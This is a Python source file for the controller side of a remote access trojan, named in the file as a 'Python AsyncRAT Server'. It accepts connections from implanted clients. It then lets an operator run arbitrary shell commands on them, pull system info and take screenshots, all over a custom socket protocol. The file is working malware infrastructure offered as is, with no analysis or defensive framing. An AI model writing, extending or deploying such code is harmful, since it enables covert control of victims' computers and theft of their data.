import socket
import threading
import struct
import json
import os
import sys

# Configuration
HOST = '0.0.0.0'
PORT = 5000
BUFFER_SIZE = 1024 * 64

class RATServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}  # {client_socket: client_address}
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def start(self):
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f"[*] Server listening on {self.host}:{self.port}")
            
            # Start a thread to accept connections
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Main command loop
            self.command_loop()
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.server_socket.close()

    def accept_connections(self):
        while True:
            try:
                client_socket, addr = self.server_socket.accept()
                print(f"\n[*] New connection from {addr[0]}:{addr[1]}")
                self.clients[client_socket] = addr
                
                # Start handling this client
                # In a full GUI app, we'd handle messages here. FOr CLI console, we'll keep it simple/synchronous for now
                # or just listen for heartbeat/info.
                # For this simplified version, we just add it to the list.
            except Exception as e:
                print(f"[!] Error accepting connection: {e}")

    def send_command(self, client_socket, command):
        try:
            # Protocol: [Length (4 bytes)][Command (json)]
            # We'll send simple text commands for now, or JSON packets
            packet = json.dumps(command).encode('utf-8')
            length = struct.pack('!I', len(packet))
            client_socket.sendall(length + packet)
            
            # Receive response
            # First 4 bytes length
            header = self.recv_all(client_socket, 4)
            if not header:
                return None
            msg_length = struct.unpack('!I', header)[0]
            response_data = self.recv_all(client_socket, msg_length)
            return json.loads(response_data)
        except Exception as e:
            print(f"[!] Error communicating with client: {e}")
            self.remove_client(client_socket)
            return None

    def recv_all(self, sock, size):
        data = b''
        while len(data) < size:
            chunk = sock.recv(size - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def remove_client(self, client_socket):
        if client_socket in self.clients:
            print(f"[-] Client {self.clients[client_socket]} disconnected")
            del self.clients[client_socket]
            client_socket.close()

    def command_loop(self):
        while True:
            print("\n--- Connected Clients ---")
            client_list = list(self.clients.keys())
            for idx, sock in enumerate(client_list):
                addr = self.clients[sock]
                print(f"[{idx}] {addr[0]}:{addr[1]}")
            
            print("-------------------------")
            print("Select client index, or 'exit' anywhere to quit.")
            choice = input("async-rat-py > ").strip()
            
            if choice.lower() == 'exit':
                break
            
            try:
                idx = int(choice)
                if 0 <= idx < len(client_list):
                    self.interact_with_client(client_list[idx])
                else:
                    print("Invalid client index.")
            except ValueError:
                pass

    def interact_with_client(self, client_socket):
        print(f"\n[*] Interacting with {self.clients[client_socket]}")
        print("Commands: shell <cmd>, info, screenshot, exit")
        
        while True:
            cmd_str = input(f"({self.clients[client_socket][0]}) > ").strip()
            if not cmd_str:
                continue
            
            if cmd_str.lower() == 'exit':
                break
                
            parts = cmd_str.split(' ', 1)
            action = parts[0].lower()
            
            payload = {}
            if action == 'shell':
                if len(parts) > 1:
                    payload = {'type': 'shell', 'command': parts[1]}
                else:
                    print("Usage: shell <command>")
                    continue
            elif action == 'info':
                payload = {'type': 'info'}
            elif action == 'screenshot':
                payload = {'type': 'screenshot'}
            else:
                print("Unknown command")
                continue
                
            response = self.send_command(client_socket, payload)
            
            if response:
                if 'output' in response:
                    print(f"\n{response['output']}")
                if 'error' in response:
                    print(f"\nError: {response['error']}")
                if 'screenshot_path' in response:
                    print(f"\nScreenshot saved to: {response['screenshot_path']}")
            else:
                print("Client disconnected or error.")
                break

if __name__ == "__main__":
    print(f"Starting Python AsyncRAT Server on {HOST}:{PORT}")
    server = RATServer(HOST, PORT)
    server.start()
